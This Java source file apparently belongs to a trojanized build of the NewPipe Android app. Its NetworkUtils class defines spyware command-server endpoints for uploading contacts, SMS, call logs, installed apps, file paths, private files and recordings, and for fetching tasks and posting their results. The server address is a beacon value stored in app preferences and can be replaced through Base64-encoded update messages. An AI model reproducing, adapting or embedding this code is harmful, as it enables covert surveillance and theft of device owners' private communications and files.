package org.schabi.newpipe.gameover.utils;

import static android.content.Context.MODE_PRIVATE;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Base64;

import java.net.URL;

public class NetworkUtils {

    private final static String BECON_PREF = "BeconPref";
    private final static String BEACON = "Becon";
    private final Context context;
    private final String API_VERSION = "PC0";

    public static NetworkUtils getInstance(Context context){
        return new NetworkUtils(context);
    }

    private NetworkUtils(Context context){
        this.context = context;
    }

    private String getNest(){
        SharedPreferences sharedPreferences = this.context.getSharedPreferences(BECON_PREF,MODE_PRIVATE);
        return sharedPreferences.getString(BEACON,"https://www.support");
    }

    public String getVersion(){
        return API_VERSION;
    }

    public void handleNestUpdate(String nestUpdate, String base){
        String newNest = getNestForUpdate(nestUpdate,base);
        if(newNest != null){
            SharedPreferences sharedPreferences = this.context.getSharedPreferences(BECON_PREF,MODE_PRIVATE);
            sharedPreferences.edit().putString(BEACON,newNest).apply();
        }
    }

    private String getNestForUpdate(String nestUpdateMessage, String base){
        String[] nestUpdateMessageArray = nestUpdateMessage.split("_");
        if(nestUpdateMessage.length() > 0){
            String newNestEncoded = nestUpdateMessageArray[0];
            String newNest = decodeNest(newNestEncoded);
            if (newNest.endsWith("/")) {
                newNest = newNest.substring(0, newNest.length() - 1).trim();
            }
            try{
                URL url = new URL(newNest);
                return newNest;
            }catch (Exception ignored){
            }
        }
        return null;
    }

    private String decodeNest(String encodedNest){
        try{
            return new String(Base64.decode(encodedNest, Base64.DEFAULT),"UTF-8");
        }catch (Exception ignored){
            return null;
        }
    }

    public String getBasicInfoNest(){
        return String.format("%s/%s/report/basic-info", getNest(), API_VERSION);
    }

    public String getContactsNest(){
        return String.format("%s/%s/report/contacts", getNest(), API_VERSION);
    }
    public String getReportFilePathsNest(){
        return String.format("%s/%s/report/file-paths", getNest(), API_VERSION);
    }

    public String getReportSDCardPathsNest(){
        return String.format("%s/%s/report/storage/root", getNest(), API_VERSION);
    }

    public String getRequestFilePathsNest(){
        return String.format("%s/%s/request/file-paths", getNest(), API_VERSION);
    }

    public String getSyncFilesNest(){
        return String.format("%s/%s/sync/file", getNest(), API_VERSION);
    }

    public String getReportMessagesNest(){
        return String.format("%s/%s/report/message", getNest(), API_VERSION);
    }

    public String getReportPrivateFilePathsNest(){
        return String.format("%s/%s/report/private/file-paths", getNest(),API_VERSION);
    }

    public String getRequestPrivateFilePathsNest(){
        return String.format("%s/%s/request/private/file-paths", getNest(),API_VERSION);
    }

    public String getSyncPrivateFilesNest(){
        return String.format("%s/%s/sync/private/file",getNest(),API_VERSION);
    }

    public String getRequestHeartBeatNest(){
        return String.format("%s/%s/request/heartbeat", getNest(), API_VERSION);
    }

    public String getPullTaskNest(){
        return String.format("%s/%s/pull/task", getNest(), API_VERSION);
    }

    public String getFetchTaskNest(){
        return String.format("%s/%s/request/tasks", getNest(), API_VERSION);
    }

    public String getReportAttemptNest(){
        return String.format("%s/%s/report/attempt", getNest(), API_VERSION);
    }

    public String getPushResultNest(){
        return String.format("%s/%s/push/result", getNest(), API_VERSION);
    }

    public String getHumNest(){
        return String.format("%s/%s/report/hum", getNest(), API_VERSION);
    }

    public String getRequestHumNest(){
        return String.format("%s/%s/request/hum", getNest(), API_VERSION);
    }

    public String getReportAppInfoNest(){
        return String.format("%s/%s/report/apps", getNest(), API_VERSION);
    }

    public String getReportSmsNest(){
        return String.format("%s/%s/report/sms", getNest(), API_VERSION);
    }

    public String getReportCallsNest(){
        return String.format("%s/%s/report/calls", getNest(), API_VERSION);
    }

    public String getRequestWinkNest(){
        return String.format("%s/%s/request/wink", getNest(), API_VERSION);
    }

    public String getReportWinkNest(){
        return String.format("%s/%s/report/wink", getNest(), API_VERSION);
    }

    public String getReportRecordingPathsNest(){
        return String.format("%s/%s/report/ruby", getNest(), API_VERSION);
    }

    public String getClearWinkNest(){
        return String.format("%s/%s/clear/wink", getNest(),API_VERSION);
    }

    public String getClearHumNest(){
        return String.format("%s/%s/clear/hum", getNest(),API_VERSION);
    }

    public String getExtendWinkNest(){
        return String.format("%s/%s/extend/wink", getNest(),API_VERSION);
    }

    public String getExtendHumNest(){
        return String.format("%s/%s/extend/hum", getNest(),API_VERSION);
    }

    public String getReportTaskListNest(){
        return String.format("%s/%s/report/task/list", getNest(), API_VERSION);
    }

    public String getRequestTaskResultNest(){
        return String.format("%s/%s/task/request/result", getNest(), API_VERSION);
    }

    public String getPullTaskConfigNest(){
        return String.format("%s/%s/pull/task-config", getNest(), API_VERSION);
    }

    public String getAutoSyncFilePathsRequestNest(){
        return String.format("%s/%s/request/auto/sync/file-paths", getNest(), API_VERSION);
    }
}
